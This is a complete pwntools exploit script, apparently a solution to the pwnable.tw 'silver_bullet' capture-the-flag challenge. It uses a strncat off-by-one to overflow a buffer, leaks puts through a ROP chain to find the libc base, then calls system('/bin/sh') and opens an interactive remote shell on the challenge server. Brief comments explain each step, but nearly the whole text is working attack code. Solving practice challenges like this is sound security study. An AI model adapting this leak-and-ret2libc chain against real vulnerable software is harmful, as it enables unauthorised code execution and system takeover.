from pwn import *

DEBUG = 0
r = None

elf = ELF('./silver_bullet')
libc = ELF('./lib/libc.so.6')

if DEBUG:
	r = process('./silver_bullet')
	context.log_level = 'debug'
else:
	r = remote('chall.pwnable.tw', 10103)

def create_bullet(description):
	r.recvuntil(b'Your choice :')
	r.sendline(b'1')
	r.recvuntil(b'Give me your description of bullet :')
	r.sendline(description)

def power_up(description):
	r.recvuntil(b'Your choice :')
	r.sendline(b'2')
	r.recvuntil(b'Give me your another description of bullet :')
	r.sendline(description)

def beat():
	r.recvuntil(b'Your choice :')
	r.sendline(b'3')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

puts2base = libc.symbols['puts']
base2system = libc.symbols['system']
base2shell = next(libc.search(b'/bin/sh\x00'))

log.info(f"puts@plt : {hex(puts_plt)}")
log.info(f"puts@got : {hex(puts_got)}")
log.info(f"main() : {hex(main)}")

# set bullet power to 1 via 0-byte after strncat
# when we fill firstly 47 'a' and then put one more 'a'
# via power_up(), strncat will concatenate them and put 0
# which will be places instead of bullet's power

payload = b'a' * 47
create_bullet(payload)

payload = b'a'
power_up(payload)

# we can put 47 bytes more (3 + 4 to overflow buf & 40 to put ROP)
# let's leak libc address & ret2main
# puts waits return address and argument in the stack

payload = b'\xff' * 7 + p32(puts_plt) + p32(main) + p32(puts_got)
power_up(payload)

# trigger to return from main 
beat()

# get a libc.puts() address
r.recvuntil(b'Oh ! You win !!\n')

libc_puts = u32(r.recv(4))
libc_base = libc_puts - puts2base
libc_system = libc_base + base2system
bin_sh = libc_base + base2shell

log.info(f"libc.puts() : {hex(libc_puts)}")
log.info(f"libc.base : {hex(libc_base)}")
log.info(f"libc.system() : {hex(libc_system)}")
log.info(f"\"/bin/sh\" : {hex(bin_sh)}")

# repeat for system(/bin/sh)
payload = b'a' * 47
create_bullet(payload)

payload = b'a'
power_up(payload)

payload = b'\xff' * 7 + p32(libc_system) + p32(bin_sh) + p32(bin_sh)
power_up(payload)
beat()

r.interactive()
